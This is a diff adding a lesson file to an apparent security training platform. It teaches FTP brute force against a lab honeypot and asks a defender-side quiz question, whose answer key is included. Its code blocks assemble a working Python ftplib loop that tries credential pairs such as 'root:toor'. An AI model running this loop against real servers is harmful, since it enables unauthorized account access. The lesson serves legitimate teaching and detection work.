@@ -1,0 +1,87 @@
+id = "ftp-hydra"
+family = "attack"
+title = "FTP brute force"
+blurb = "Walk a list of user:pass pairs against an FTP server with ftplib."
+ttps = ["T1110.001", "T1110.004"]
+difficulty = "medium"
+typing_model = "python"
+
+briefing = """
+**MITRE ATT&CK:** T1110.001 (*Password Guessing*) / T1110.004
+(*Credential Stuffing*)
+
+FTP brute force is the same idea as SSH-Hydra but simpler — no transport
+handshake, just connect → USER → PASS, repeat. The defender records each
+`FTP_COMMAND` event; the `PASS` commands are the auth attempts. If they all
+use one username it's *guessing* (T1110.001); if they iterate distinct
+users it's *credential stuffing* (T1110.004).
+
+You'll type the inner `_run()` body. It walks a list of `(user, pass)`
+pairs, opening a fresh FTP connection for each. `contextlib.suppress`
+swallows the expected login failures so the loop keeps going.
+"""
+
+[live]
+scenario = "ftp-hydra"
+default_target = "ftp-honeypot:21"
+
+[[blocks]]
+kind = "prose"
+text = "Set up the counters: attempts (every pair we try) and sessions (TCP connections that actually opened)."
+
+[[blocks]]
+kind = "code"
+target = "attempts = 0"
+annotation = "One per credential pair, success or fail — this is what the defender counts."
+
+[[blocks]]
+kind = "code"
+target = "sessions = 0"
+annotation = "Incremented only when the TCP connect succeeds, so we can tell connection errors from auth failures."
+
+[[blocks]]
+kind = "code"
+target = "for u, p in pairs:"
+annotation = "pairs was parsed from the --credentials flag: 'root:toor,admin:admin' → [('root','toor'), ('admin','admin')]."
+
+[[blocks]]
+kind = "code"
+target = "    attempts += 1"
+annotation = "Count before we try, so a connection error still counts as an attempt."
+
+[[blocks]]
+kind = "code"
+target = "    f = ftplib.FTP()"
+annotation = "Fresh client per pair — FTP has no multiplexed auth like SSH transports."
+
+[[blocks]]
+kind = "code"
+target = "    f.connect(host, port, timeout=10)"
+annotation = "Opens the control connection. Raises OSError if the port is closed or blocked."
+
+[[blocks]]
+kind = "code"
+target = "    sessions += 1"
+annotation = "We're connected. From the honeypot's side, a session row now exists."
+
+[[blocks]]
+kind = "code"
+target = "    with contextlib.suppress(ftplib.error_perm):"
+annotation = "A wrong password raises ftplib.error_perm (530). Suppress it so the loop continues to the next pair."
+
+[[blocks]]
+kind = "code"
+target = "        f.login(u, p)"
+annotation = "Sends USER then PASS. Each becomes an FTP_COMMAND event the defender scores."
+
+[[blocks]]
+kind = "choice"
+prompt = "The defender wants to tell guessing (T1110.001) from stuffing (T1110.004). What signal separates them?"
+options = [
+  "The number of attempts",
+  "Whether the attempts use one username (guessing) or many distinct usernames (stuffing)",
+  "The port number",
+  "The password length",
+]
+correct = 1
+explanation = "Stuffing replays breach-dump user:pass pairs, so usernames vary. The cred-stuffing rule needs ≥4 distinct usernames; otherwise it reads as plain password guessing."
